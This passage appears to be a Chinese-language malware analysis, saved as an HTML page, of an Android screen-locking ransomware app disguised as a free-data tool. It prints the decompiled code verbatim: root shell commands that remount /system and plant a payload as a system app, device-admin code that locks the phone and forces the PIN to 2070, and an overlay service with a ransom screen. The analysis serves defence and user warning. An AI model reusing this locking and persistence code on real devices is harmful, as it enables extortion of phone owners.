@@ -1,0 +1,858 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>一个免流锁机样本</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<style type="text/css">
+/* GitHub stylesheet for MarkdownPad (http://markdownpad.com) */
+/* Author: Nicolas Hery - http://nicolashery.com */
+/* Version: b13fe65ca28d2e568c6ed5d7f06581183df8f2ff */
+/* Source: https://github.com/nicolahery/markdownpad-github */
+
+/* RESET
+=============================================================================*/
+
+html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, b, u, i, center, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td, article, aside, canvas, details, embed, figure, figcaption, footer, header, hgroup, menu, nav, output, ruby, section, summary, time, mark, audio, video {
+  margin: 0;
+  padding: 0;
+  border: 0;
+}
+
+/* BODY
+=============================================================================*/
+
+body {
+  font-family: Helvetica, arial, freesans, clean, sans-serif;
+  font-size: 14px;
+  line-height: 1.6;
+  color: #333;
+  background-color: #fff;
+  padding: 20px;
+  max-width: 960px;
+  margin: 0 auto;
+}
+
+body>*:first-child {
+  margin-top: 0 !important;
+}
+
+body>*:last-child {
+  margin-bottom: 0 !important;
+}
+
+/* BLOCKS
+=============================================================================*/
+
+p, blockquote, ul, ol, dl, table, pre {
+  margin: 15px 0;
+}
+
+/* HEADERS
+=============================================================================*/
+
+h1, h2, h3, h4, h5, h6 {
+  margin: 20px 0 10px;
+  padding: 0;
+  font-weight: bold;
+  -webkit-font-smoothing: antialiased;
+}
+
+h1 tt, h1 code, h2 tt, h2 code, h3 tt, h3 code, h4 tt, h4 code, h5 tt, h5 code, h6 tt, h6 code {
+  font-size: inherit;
+}
+
+h1 {
+  font-size: 28px;
+  color: #000;
+}
+
+h2 {
+  font-size: 24px;
+  border-bottom: 1px solid #ccc;
+  color: #000;
+}
+
+h3 {
+  font-size: 18px;
+}
+
+h4 {
+  font-size: 16px;
+}
+
+h5 {
+  font-size: 14px;
+}
+
+h6 {
+  color: #777;
+  font-size: 14px;
+}
+
+body>h2:first-child, body>h1:first-child, body>h1:first-child+h2, body>h3:first-child, body>h4:first-child, body>h5:first-child, body>h6:first-child {
+  margin-top: 0;
+  padding-top: 0;
+}
+
+a:first-child h1, a:first-child h2, a:first-child h3, a:first-child h4, a:first-child h5, a:first-child h6 {
+  margin-top: 0;
+  padding-top: 0;
+}
+
+h1+p, h2+p, h3+p, h4+p, h5+p, h6+p {
+  margin-top: 10px;
+}
+
+/* LINKS
+=============================================================================*/
+
+a {
+  color: #4183C4;
+  text-decoration: none;
+}
+
+a:hover {
+  text-decoration: underline;
+}
+
+/* LISTS
+=============================================================================*/
+
+ul, ol {
+  padding-left: 30px;
+}
+
+ul li > :first-child, 
+ol li > :first-child, 
+ul li ul:first-of-type, 
+ol li ol:first-of-type, 
+ul li ol:first-of-type, 
+ol li ul:first-of-type {
+  margin-top: 0px;
+}
+
+ul ul, ul ol, ol ol, ol ul {
+  margin-bottom: 0;
+}
+
+dl {
+  padding: 0;
+}
+
+dl dt {
+  font-size: 14px;
+  font-weight: bold;
+  font-style: italic;
+  padding: 0;
+  margin: 15px 0 5px;
+}
+
+dl dt:first-child {
+  padding: 0;
+}
+
+dl dt>:first-child {
+  margin-top: 0px;
+}
+
+dl dt>:last-child {
+  margin-bottom: 0px;
+}
+
+dl dd {
+  margin: 0 0 15px;
+  padding: 0 15px;
+}
+
+dl dd>:first-child {
+  margin-top: 0px;
+}
+
+dl dd>:last-child {
+  margin-bottom: 0px;
+}
+
+/* CODE
+=============================================================================*/
+
+pre, code, tt {
+  font-size: 12px;
+  font-family: Consolas, "Liberation Mono", Courier, monospace;
+}
+
+code, tt {
+  margin: 0 0px;
+  padding: 0px 0px;
+  white-space: nowrap;
+  border: 1px solid #eaeaea;
+  background-color: #f8f8f8;
+  border-radius: 3px;
+}
+
+pre>code {
+  margin: 0;
+  padding: 0;
+  white-space: pre;
+  border: none;
+  background: transparent;
+}
+
+pre {
+  background-color: #f8f8f8;
+  border: 1px solid #ccc;
+  font-size: 13px;
+  line-height: 19px;
+  overflow: auto;
+  padding: 6px 10px;
+  border-radius: 3px;
+}
+
+pre code, pre tt {
+  background-color: transparent;
+  border: none;
+}
+
+kbd {
+    -moz-border-bottom-colors: none;
+    -moz-border-left-colors: none;
+    -moz-border-right-colors: none;
+    -moz-border-top-colors: none;
+    background-color: #DDDDDD;
+    background-image: linear-gradient(#F1F1F1, #DDDDDD);
+    background-repeat: repeat-x;
+    border-color: #DDDDDD #CCCCCC #CCCCCC #DDDDDD;
+    border-image: none;
+    border-radius: 2px 2px 2px 2px;
+    border-style: solid;
+    border-width: 1px;
+    font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+    line-height: 10px;
+    padding: 1px 4px;
+}
+
+/* QUOTES
+=============================================================================*/
+
+blockquote {
+  border-left: 4px solid #DDD;
+  padding: 0 15px;
+  color: #777;
+}
+
+blockquote>:first-child {
+  margin-top: 0px;
+}
+
+blockquote>:last-child {
+  margin-bottom: 0px;
+}
+
+/* HORIZONTAL RULES
+=============================================================================*/
+
+hr {
+  clear: both;
+  margin: 15px 0;
+  height: 0px;
+  overflow: hidden;
+  border: none;
+  background: transparent;
+  border-bottom: 4px solid #ddd;
+  padding: 0;
+}
+
+/* TABLES
+=============================================================================*/
+
+table th {
+  font-weight: bold;
+}
+
+table th, table td {
+  border: 1px solid #ccc;
+  padding: 6px 13px;
+}
+
+table tr {
+  border-top: 1px solid #ccc;
+  background-color: #fff;
+}
+
+table tr:nth-child(2n) {
+  background-color: #f8f8f8;
+}
+
+/* IMAGES
+=============================================================================*/
+
+img {
+  max-width: 100%
+}
+</style>
+</head>
+<body>
+<h2>一个免流app锁机样本的分析</h2>
+<p>这是打开界面，二次元风格还不错</p>
+<p><img src="./Image/1.png" /></p>
+<p>随意设置一下点击开启，那么会跳出超级用户权限提示，我们这里给永久记住</p>
+<p><img src="./Image/2.png" /></p>
+<p>所以啊，一般对于一下来路不明的应用，给予权限需谨慎！！！</p>
+<p>然后手机自动重启了</p>
+<p><img src="./Image/3.png" /></p>
+<p>呐，给锁住了，下面我们先把apk文件拖入jeb分析一下</p>
+<hr />
+<p>首先来看看AndroidMainfest.xml</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;manifest package=&quot;com.qqmagic&quot; xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;&gt;
+&lt;uses-sdk android:minSdkVersion=&quot;8&quot; android:targetSdkVersion=&quot;21&quot; /&gt;
+&lt;application android:debuggable=&quot;true&quot; android:icon=&quot;@drawable/ic_launcher&quot; android:label=&quot;@string/app_name&quot; android:theme=&quot;@style/AppTheme&quot;&gt;
+    &lt;activity android:label=&quot;@string/app_name&quot; android:name=&quot;.c&quot;&gt;
+        &lt;intent-filter&gt;
+            &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;
+            &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;
+        &lt;/intent-filter&gt;
+    &lt;/activity&gt;
+&lt;/application&gt;
+&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt;
+&lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot; /&gt;
+&lt;/manifest&gt;
+</code></pre>
+
+<p>这里可以看出app的入口是c类，应用有如下权限：</p>
+<p>允许程序打开网络套接字</p>
+<pre><code>android.permission.INTERNET 
+</code></pre>
+
+<p>允许程序写入外部存储，如SD卡上写文件</p>
+<pre><code>android.permission.WRITE_EXTERNAL_STORAGE
+</code></pre>
+
+<p>接下来，跟进C类查看</p>
+<pre><code>package com.qqmagic;
+
+import LogCatBroadcaster;
+import android.app.Activity;
+import android.os.Bundle;
+import android.os.Environment;
+import android.view.View$OnClickListener;
+import android.view.View;
+import android.widget.Button;
+import android.widget.EditText;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.InputStream;
+
+public class c extends Activity {
+final class ButtonClickListener implements View$OnClickListener {
+    private final c this$0;
+
+    public ButtonClickListener(c arg6) {
+        super();
+        c.this = arg6;
+    }
+
+    static c access$0(ButtonClickListener arg4) {
+        return arg4.this$0;
+    }
+  //一个按钮点击事件
+    @Override public void onClick(View arg8) {
+        new b().rootShell(); //new了一个b类，并且调用它的rootshell()方法
+        a.deleteFile(c.this.file);//调用了a类的deleteFile()方法
+    }
+}
+</code></pre>
+
+<p>那么我们跟进b类查看rootShell()方法：
+发现b类里面定义了一大堆静态方法，都是一些检查权限，初始化命令的一些方法，重点是这个：</p>
+<pre><code>void rootShell() {
+    b.execCommand(new String[]{&quot;mount -o rw,remount /system&quot;, &quot;mount -o rw,remount /system/app&quot;, &quot;cp /sdcard/zihao.l /system/app/&quot;, &quot;chmod 777 /system/app/zihao.l&quot;, &quot;mv /system/app/zihao.l /system/app/zihao.apk&quot;, &quot;chmod 644 /system/app/zihao.apk&quot;, &quot;reboot&quot;}, true);
+}
+</code></pre>
+
+<p>这里熟悉指令的可以看出，它重新挂载了/system目录，然后复制zihao.l到/system/app下 最后将zihao.1文件改为zihao.apk文件，并且将这个文件的权限定义为可读，可写，可执行，然后重启，那么这里就很可疑了</p>
+<p>继续查看a类：</p>
+<pre><code>public static boolean deleteFile(String arg7) { //传入v7
+    boolean v0;
+    File v1 = new File(arg7);  //新建一个名为v7的文件v1
+    if(!v1.exists() || !v1.isFile()) { // 不正常或者不存在
+        v0 = false;  
+    }  
+    else if(v1.delete()) { //删除v1
+        v0 = true;
+    }
+    else {
+        v0 = false;
+    }
+
+    return v0;  //返回真或者假
+}
+</code></pre>
+
+<p>这里就是一个判断，下面继续跟进c类分析：</p>
+<pre><code>private Button a;
+private Button b;
+private EditText c;
+a del;  //声明一个a类变量del
+String file;
+String path;
+private Button q;
+private EditText s;
+private EditText t;
+private EditText w;
+private Button z;
+
+public c() {
+    super();
+    this.del = new a();
+    this.path = this.g();
+    this.file = new StringBuffer().append(this.path).append(&quot;/zihao.l&quot;).toString();
+}//这里意图很明显，在路径后面添加/zihao.l
+
+private void d(String arg13) throws IOException {
+    FileOutputStream v3 = new FileOutputStream(arg13);
+    InputStream v2 = this.getAssets().open(&quot;ijm-x86.so&quot;);//这里将ijm-x86.so文件写入
+    byte[] v4 = new byte[1024];
+    int v5;
+    for(v5 = v2.read(v4); v5 &gt; 0; v5 = v2.read(v4)) {
+        v3.write(v4, 0, v5);
+    }
+
+    v3.flush();
+    v2.close();
+    v3.close();
+}
+//获取存储路径的方法
+public final String g() {
+    String v1 = null;
+    if(Environment.getExternalStorageState().equals(&quot;mounted&quot;)) {
+        v1 = Environment.getExternalStorageDirectory().getAbsolutePath();
+    }
+
+    return v1;
+}
+
+@Override protected void onCreate(Bundle arg10) {
+    c v0 = this;
+    LogCatBroadcaster.start(v0);
+    super.onCreate(arg10);
+    v0.setContentView(2130903040);
+    v0.b = v0.findViewById(2131099651);
+    v0.t = v0.findViewById(2131099648);
+    v0.b.setOnClickListener(new ButtonClickListener(v0));
+    v0.q = v0.findViewById(2131099649);
+    v0.w = v0.findViewById(2131099648);
+    v0.q.setOnClickListener(new ButtonClickListener(v0));
+    v0.a = v0.findViewById(2131099650);
+    v0.s = v0.findViewById(2131099648);
+    v0.a.setOnClickListener(new ButtonClickListener(v0));
+    v0.z = v0.findViewById(2131099652);
+    v0.c = v0.findViewById(2131099648);
+    v0.z.setOnClickListener(new ButtonClickListener(v0));
+    c v4 = v0;
+    try {
+        v4.d(new StringBuffer().append(v0.path).append(&quot;/zihao.l&quot;).toString());
+    }
+    catch(IOException v4_1) {
+    }
+}
+
+@Override protected void onDestroy() {
+    a.deleteFile(this.file);
+    super.onDestroy();
+}
+}
+</code></pre>
+
+<p>那么大致分析完了，我们来看看ijm-x86.so文件，最初以为是爱家密的壳，后来，jeb识别出他是一个apk文件</p>
+<p><img src="./Image/4.png" />
+那么改下后缀名，运行下看看</p>
+<hr />
+<p><img src="./Image/5.png" /></p>
+<p>发现是一个秒抢红包app，并且要求激活设备管理器，安装后模机器卡住了，重启后就变成了这样：</p>
+<p><img src="./Image/6.png" /></p>
+<p>用jeb打开这个apk进行分析</p>
+<hr />
+<p>同刚才一样，先分析AndroidMainifest.xml文件：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;manifest package=&quot;com.h&quot; xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;&gt;
+&lt;uses-permission android:name=&quot;android.permission.SEND_SMS&quot; /&gt;
+&lt;uses-permission android:name=&quot;android.permission.SYSTEM_ALERT_WINDOW&quot; /&gt;
+&lt;uses-permission android:name=&quot;android.permission.RECEIVE_BOOT_COMPLETED&quot; /&gt;
+&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt;
+&lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot; /&gt;
+&lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot; /&gt;
+&lt;uses-permission android:name=&quot;android.permission.MOUNT_UNMOUNT_FILESYSTEMS&quot; /&gt;
+&lt;uses-permission android:name=&quot;android.permission.VIBRATE&quot; /&gt;
+&lt;uses-sdk android:minSdkVersion=&quot;8&quot; android:targetSdkVersion=&quot;21&quot; /&gt;
+&lt;application android:debuggable=&quot;true&quot; android:icon=&quot;@drawable/icon&quot; android:label=&quot;@string/app_name&quot; android:theme=&quot;@style/AppTheme&quot;&gt;
+    &lt;activity android:label=&quot;@string/app_name&quot; android:name=&quot;.M&quot;&gt;
+        &lt;intent-filter&gt;
+            &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;
+            &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;
+        &lt;/intent-filter&gt;
+    &lt;/activity&gt;
+    &lt;service android:name=&quot;s&quot; /&gt;
+    &lt;receiver android:name=&quot;bbb&quot;&gt;
+        &lt;intent-filter android:priority=&quot;2147483647&quot;&gt;
+            &lt;action android:name=&quot;android.intent.action.BOOT_COMPLETED&quot; /&gt;
+        &lt;/intent-filter&gt;
+    &lt;/receiver&gt;
+    &lt;receiver android:description=&quot;@string/hello&quot; android:name=&quot;.MyAdmin&quot;&gt;
+        &lt;meta-data android:name=&quot;android.app.device_admin&quot; android:resource=&quot;@xml/my_admin&quot; /&gt;
+        &lt;intent-filter&gt;
+            &lt;action android:name=&quot;android.app.action.DEVICE_ADMIN_ENABLED&quot; /&gt;
+        &lt;/intent-filter&gt;
+    &lt;/receiver&gt;
+&lt;/application&gt;
+&lt;/manifest&gt;
+</code></pre>
+
+<p>首先，入口为M类，下面来分析一下权限：</p>
+<p>允许发送短信</p>
+<pre><code>&lt;uses-permission android:name=&quot;android.permission.SEND_SMS&quot; /&gt;
+</code></pre>
+
+<p>允许程序打开一个窗口</p>
+<pre><code>&lt;uses-permission android:name=&quot;android.permission.SYSTEM_ALERT_WINDOW&quot; /&gt;
+</code></pre>
+
+<p>允许一个程序接收到 ACTION_BOOT_COMPLETED广播在系统完成启动</p>
+<pre><code>&lt;uses-permission android:name=&quot;android.permission.RECEIVE_BOOT_COMPLETED&quot; /&gt;
+</code></pre>
+
+<p>访问网络连接，可能产生GPRS流量</p>
+<pre><code>&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt;
+</code></pre>
+
+<p>获取网络信息状态，如当前的网络连接是否有效</p>
+<pre><code>&lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot; /&gt;
+</code></pre>
+
+<p>允许写入外部设备</p>
+<pre><code>&lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot; /&gt;
+</code></pre>
+
+<p>挂载、反挂载外部文件系统</p>
+<pre><code>&lt;uses-permission android:name=&quot;android.permission.MOUNT_UNMOUNT_FILESYSTEMS&quot; /&gt;
+</code></pre>
+
+<p>允许振动</p>
+<pre><code>&lt;uses-permission android:name=&quot;android.permission.VIBRATE&quot; /&gt;
+</code></pre>
+
+<hr />
+<p>可以发现这里大部分权限都会产生一定的危害，所以给予权限时一定要小心谨慎 ，特别是一些未知的app</p>
+<p>下面看看这个：</p>
+<pre><code>&lt;service android:name=&quot;s&quot; /&gt;
+
+&lt;receiver android:name=&quot;bbb&quot;&gt;
+    &lt;intent-filter android:priority=&quot;2147483647&quot;&gt;
+        &lt;action android:name=&quot;android.intent.action.BOOT_COMPLETED&quot; /&gt;
+    &lt;/intent-filter&gt;
+&lt;/receiver&gt;
+&lt;receiver android:description=&quot;@string/hello&quot; android:name=&quot;.MyAdmin&quot;&gt;
+    &lt;meta-data android:name=&quot;android.app.device_admin&quot; android:resource=&quot;@xml/my_admin&quot; /&gt;
+    &lt;intent-filter&gt;
+        &lt;action android:name=&quot;android.app.action.DEVICE_ADMIN_ENABLED&quot; /&gt;
+    &lt;/intent-filter&gt;
+&lt;/receiver&gt;
+</code></pre>
+
+<p>这里注册了一个服务以及两个广播接收器</p>
+<p>下面跟进M类：</p>
+<pre><code>package com.h;
+
+import LogCatBroadcaster;
+import android.app.Activity;
+import android.content.ComponentName;
+import android.content.Context;
+import android.content.Intent;
+import android.os.Bundle;
+import android.os.Parcelable;
+
+public class M extends Activity {
+public M() {
+    super();
+}
+
+private void activiteDevice() {
+    Class v8;
+    M v0 = this;
+    Intent v1 = new Intent(&quot;android.app.action.ADD_DEVICE_ADMIN&quot;);
+    ComponentName v5 = null;
+    ComponentName v6 = null;
+    M v7 = v0;
+    try {
+        v8 = Class.forName(&quot;com.h.MyAdmin&quot;); //判断该类是否存在
+    }
+    catch(ClassNotFoundException v5_1) {
+        throw new NoClassDefFoundError(v5_1.getMessage());
+    }
+
+    super(((Context)v7), v8);
+    v1.putExtra(&quot;android.app.extra.DEVICE_ADMIN&quot;, ((Parcelable)v5));
+    v0.startActivityForResult(v1, 0); 隐式启动com.h.MyAdmin
+}
+
+@Override public void onCreate(Bundle arg6) {
+    LogCatBroadcaster.start(this);
+    super.onCreate(arg6);
+    this.activiteDevice();
+}
+}
+</code></pre>
+
+<p>这里主要的作用可以看出来是隐式启动com.h.MyAdmin,跟进分析：</p>
+<pre><code>public class MyAdmin extends DeviceAdminReceiver {
+public MyAdmin() {
+    super();
+}
+//这里是点了不激活设备管理器后调用的方法
+@Override public CharSequence onDisableRequested(Context arg10, Intent arg11) {
+    String v4 = Integer.toString(2070);
+    this.getManager(arg10).lockNow();
+    this.getManager(arg10).resetPassword(v4, 0); //这里将屏幕锁住，并将锁屏密码设置为2070
+    return super.onDisableRequested(arg10, arg11);
+}
+//激活后调用的方法
+@Override public void onEnabled(Context arg17, Intent arg18) {
+    Class v11;
+    MyAdmin v0 = this;
+    Context v1 = arg17;
+    Intent v2 = arg18;
+    String v4 = Integer.toString(2070);
+    Intent v8 = null;
+    Intent v9 = null;
+    Context v10 = v1;
+    try {
+        v11 = Class.forName(&quot;com.h.s&quot;);//寻找这个类
+    }
+    catch(ClassNotFoundException v8_1) {
+        throw new NoClassDefFoundError(v8_1.getMessage());
+    }
+
+    super(v10, v11);
+    v8.setFlags(268435456); 
+    v1.startService(v8); //启动这个service
+    v0.getManager(v1).resetPassword(v4, 0);
+    super.onEnabled(v1, v2);
+}
+锁屏密码改变
+@Override public void onPasswordChanged(Context arg10, Intent arg11) {
+    String v4 = Integer.toString(2070);
+    this.getManager(arg10).lockNow();
+    this.getManager(arg10).resetPassword(v4, 0);//不激活，锁屏密码照样设置为2070
+    super.onPasswordChanged(arg10, arg11);
+}
+
+@Override public void onReceive(Context arg8, Intent arg9) {
+    Log.i(&quot;------&quot;, &quot;onReceive-----&quot;);
+    super.onReceive(arg8, arg9);
+}
+}
+</code></pre>
+
+<p>可以发现这里将锁屏 密码设置为了2070，并且试图调用com.h.s类，那么我们跟进分析：</p>
+<p>进入com.h.s类，在最下面找到了onStart方法：</p>
+<pre><code>@Override public void onStart(Intent arg8, int arg9) {
+super.onStart(arg8, arg9);
+this.c();
+}
+</code></pre>
+
+<p>继续跟进c()方法：</p>
+<pre><code>private void c() {
+    s v0 = this;
+    v0.wmParams = new WindowManager$LayoutParams();
+    Application v6 = v0.getApplication();
+    v0.getApplication();
+    v0.mWindowManager = v6.getSystemService(Context.WINDOW_SERVICE);
+    v0.wmParams.type = 2010;
+    v0.wmParams.format = 1;
+    v0.wmParams.flags = 1280;
+    v0.wmParams.gravity = 49;
+    v0.wmParams.x = 0;
+    v0.wmParams.y = 0;
+    v0.wmParams.width = -1;
+    v0.wmParams.height = -1;
+    v0.mFloatLayout = LayoutInflater.from(v0.getApplication()).inflate(2130903041, null);//加载布局，
+    MediaPlayer v2 = MediaPlayer.create(v0, 2131099648);
+    v2.setLooping(true);
+    v2.start();
+    v0.mWindowManager.addView(v0.mFloatLayout, v0.wmParams);
+    v0.bt = v0.mFloatLayout.findViewById(2131361794);
+    v0.ed = v0.mFloatLayout.findViewById(2131361792);
+    v0.tv = v0.mFloatLayout.findViewById(2131361793);
+    s v5 = v0;
+    try {
+        v5.ed.setHint(v0.des.decrypt(&quot;1d836c668669c91d&quot;));
+        v0.tv.append(v0.des.decrypt(&quot;加群562437579&quot;));
+    }
+    catch(Exception v5_1) {
+    }
+    //上面都是一些加载布局的作用，可以在resource文件夹中找到对应的
+    v0.bt.setOnClickListener(new 100000001(v0));
+    v5 = v0;
+    try {
+        v5.tv.append(new StringBuffer().append(&quot;\n&quot;).append(v0.des.decrypt(&quot;06812251e1b3f7584b2b95295befdafe&quot;)).toString());
+        v0.tv.append(new StringBuffer().append(new StringBuffer().append(&quot;\n&quot;).append(v0.des.decrypt(&quot;c238c3a8b991ef7b58bf03ec28d82946&quot;)).toString()).append(v0.share.getLong(&quot;m&quot;, ((long)0))).toString());//根据后面的可知这里会显示那串共享的随机数，根据后文的布局分析，就是死逼代码
+    }
+    catch(Exception v5_1) {
+    }
+}
+</code></pre>
+
+<p>继续往下分析，那么这里是关键了：</p>
+<pre><code>@Override public void onCreate() {
+    s v0 = this;
+    super.onCreate();
+    v0.pass = ((long)(Math.random() * (((double)1000000))));//一个随机数
+    v0.passw = new Long(v0.pass - (((long)112)));//随机数-112
+    v0.des = new DU(&quot;des&quot;);//这里调用了一个加密类，具体算法这里不分析了，可以跟进看一下
+    s v4 = v0;
+    try {
+        v4.des = new DU(v0.des.decrypt(&quot;78d30a56e58aa1de&quot;));
+    }
+    catch(Exception v4_1) {
+    }
+
+    v0.share = v0.getSharedPreferences(&quot;Flowers&quot;, 0);
+    v0.editor = v0.share.edit();
+    v0.getApplication().getSystemService(&quot;vibrator&quot;).vibrate(new long[]{((long)100), ((long)1500), ((long)100), ((long)1500)}, 0);
+    if(v0.share.getLong(&quot;m&quot;, ((long)0)) == (((long)0))) {
+        v0.editor.putLong(&quot;m&quot;, v0.pass);
+        v0.editor.commit();
+        v4 = v0;
+        try {
+            v4.editor.putString(&quot;passw&quot;, v0.des.encrypt(new StringBuffer().append(&quot;&quot;).append(v0.passw).toString()));//加密
+            v0.editor.commit();
+        }
+        catch(Exception v4_1) {
+        }
+
+        if(v0.is(v0.getApplicationContext())) {
+            v0.ppss = new StringBuffer().append(v0.share.getLong(&quot;m&quot;, ((long)8))).append(&quot;&quot;).toString();
+            v4 = v0;
+            s v5 = v0;
+            try {
+                v4.password = v5.des.decrypt(v0.share.getString(&quot;passw&quot;, &quot;&quot;));//解密，可以发现，前面的加密操作压根没啥用，因为它这里又解密了，继续分析
+            }
+            catch(Exception v4_1) {
+            }
+
+            new 100000000(v0).start();
+            return;
+        }
+
+        v4 = v0;
+        try {
+            v4.editor.putLong(&quot;m&quot;, Long.parseLong(v0.des.decrypt(&quot;5a15e58cc8db8d1c700ecb6bb7b627a9&quot;)));
+            v0.editor.commit();
+            v0.editor.putString(&quot;passw&quot;, &quot;76df8ee7fc4fd40dd4604dee3003ae9c&quot;);//
+            v0.editor.commit();
+        }
+        catch(Exception v4_1) {
+        }
+    }
+}
+</code></pre>
+
+<p>这里看出一些加密的操作，那么passw就是随机数-112了</p>
+<p>接下来，回到前面：</p>
+<pre><code>public class s extends Service {
+class 100000000 extends Thread {
+    private final s this$0;
+
+    100000000(s arg6) {
+        super();
+        s.this = arg6;
+    }
+
+    static s access$0(100000000 arg4) {
+        return arg4.this$0;
+    }
+
+    public void run() {
+    }
+}
+
+class 100000001 implements View$OnClickListener {
+    private final s this$0;
+
+    100000001(s arg6) {
+        super();
+        s.this = arg6;
+    }
+
+    static s access$0(100000001 arg4) {
+        return arg4.this$0;
+    }
+   //这里定义了一个点击事件
+    @Override public void onClick(View arg10) {
+        100000001 v0 = this;
+        100000001 v4 = v0;
+        try {// 如果输入的等于passw
+            if(!v4.this$0.ed.getText().toString().equals(v0.this$0.des.decrypt(v0.this$0.share.getString(&quot;passw&quot;, &quot;&quot;)))) {
+                return;
+            }
+
+            v0.this$0.mWindowManager.removeView(v0.this$0.mFloatLayout);//那么移除这个加载的布局
+            v0.this$0.stopSelf();
+        }
+        catch(Exception v4_1) {
+        }
+    }
+}
+</code></pre>
+
+<p>这里刚刚说了我们可以去resource里查看加载的布局，通过对应的id，那么刚刚那个id是2130903041，转换为十六进制就是7F030001,:</p>
+<p><img src="./Image/7.png" /></p>
+<p>在layout里打开这个：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;LinearLayout android:layout_height=&quot;fill_parent&quot; android:layout_width=&quot;fill_parent&quot; android:orientation=&quot;vertical&quot; xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;&gt;
+&lt;LinearLayout android:background=&quot;@drawable/image_3&quot; android:gravity=&quot;center|top&quot; android:layout_height=&quot;fill_parent&quot; android:layout_width=&quot;fill_parent&quot; android:orientation=&quot;vertical&quot;&gt;
+    &lt;LinearLayout android:background=&quot;@drawable/bj&quot; android:gravity=&quot;center&quot; android:layout_height=&quot;wrap_content&quot; android:layout_marginTop=&quot;5.0dip&quot; android:layout_width=&quot;fill_parent&quot; android:orientation=&quot;vertical&quot;&gt;
+        &lt;TextView android:layout_height=&quot;2.0dip&quot; android:layout_width=&quot;2.0dip&quot; /&gt;
+        &lt;EditText android:id=&quot;@id/ed&quot; android:layout_height=&quot;4.0dip&quot; android:layout_marginEnd=&quot;200.0dip&quot; android:layout_width=&quot;200.0dip&quot; android:textColor=&quot;#ff000000&quot; /&gt;
+        &lt;TextView android:layout_height=&quot;wrap_content&quot; android:layout_width=&quot;wrap_content&quot; android:shadowColor=&quot;#ff00fff9&quot; android:shadowDx=&quot;-1.0&quot; android:shadowDy=&quot;-1.0&quot; android:shadowRadius=&quot;2.0&quot; android:text=&quot;走自己的路，让煞笔去说吧&quot; android:textAppearance=&quot;?android:textAppearanceLarge&quot; android:textColor=&quot;#ff00fff9&quot; android:textSize=&quot;23.0sp&quot; /&gt;
+        &lt;TextView android:layout_height=&quot;wrap_content&quot; android:layout_width=&quot;wrap_content&quot; android:shadowColor=&quot;#ff00fff9&quot; android:shadowDx=&quot;-1.0&quot; android:shadowDy=&quot;-1.0&quot; android:shadowRadius=&quot;2.0&quot; android:text=&quot;五块钱解锁&quot; android:textAppearance=&quot;?android:textAppearanceLarge&quot; android:textColor=&quot;#ff00ebeb&quot; android:textSize=&quot;20.0sp&quot; /&gt;
+    &lt;/LinearLayout&gt;
+    &lt;TextView android:background=&quot;@drawable/bj&quot; android:layout_height=&quot;wrap_content&quot; android:layout_width=&quot;wrap_content&quot; android:shadowColor=&quot;#ff00fff9&quot; android:shadowDx=&quot;-1.0&quot; android:shadowDy=&quot;-1.0&quot; android:shadowRadius=&quot;2.0&quot; android:text=&quot;無回qq599509367&quot; android:textColor=&quot;#ff00cfcf&quot; android:textSize=&quot;20.0sp&quot; /&gt;
+    &lt;LinearLayout android:background=&quot;@drawable/layout2&quot; android:gravity=&quot;bottom|center&quot; android:layout_height=&quot;fill_parent&quot; android:layout_width=&quot;fill_parent&quot; android:orientation=&quot;vertical&quot;&gt;
+        &lt;TextView android:background=&quot;@drawable/bj&quot; android:id=&quot;@id/tv&quot; android:layout_height=&quot;wrap_content&quot; android:layout_width=&quot;280.0dip&quot; android:shadowColor=&quot;#ff0a0a0a&quot; android:shadowRadius=&quot;3.0&quot; android:textAppearance=&quot;?android:textAppearanceLarge&quot; android:textColor=&quot;#ffffff00&quot; android:textSize=&quot;19.0sp&quot; /&gt;
+        &lt;LinearLayout android:layout_height=&quot;wrap_content&quot; android:layout_width=&quot;wrap_content&quot; android:orientation=&quot;horizontal&quot;&gt;
+            &lt;LinearLayout android:background=&quot;@drawable/bj&quot; android:layout_height=&quot;200.0dip&quot; android:layout_width=&quot;40.0dip&quot; android:orientation=&quot;vertical&quot;&gt;
+                &lt;TextView android:layout_height=&quot;wrap_content&quot; android:layout_marginEnd=&quot;10.0dip&quot; android:layout_width=&quot;wrap_content&quot; android:text=&quot;扫&quot; android:textColor=&quot;#fffa5fea&quot; android:textSize=&quot;25.0sp&quot; /&gt;
+                &lt;TextView android:layout_height=&quot;wrap_content&quot; android:layout_marginTop=&quot;20.0dip&quot; android:layout_width=&quot;wrap_content&quot; android:text=&quot;码&quot; android:textColor=&quot;#fff351b7&quot; android:textSize=&quot;25.0sp&quot; /&gt;
+                &lt;TextView android:layout_height=&quot;wrap_content&quot; android:layout_marginTop=&quot;20.0dip&quot; android:layout_width=&quot;wrap_content&quot; android:text=&quot;支&quot; android:textColor=&quot;#ffff3c66&quot; android:textSize=&quot;25.0sp&quot; /&gt;
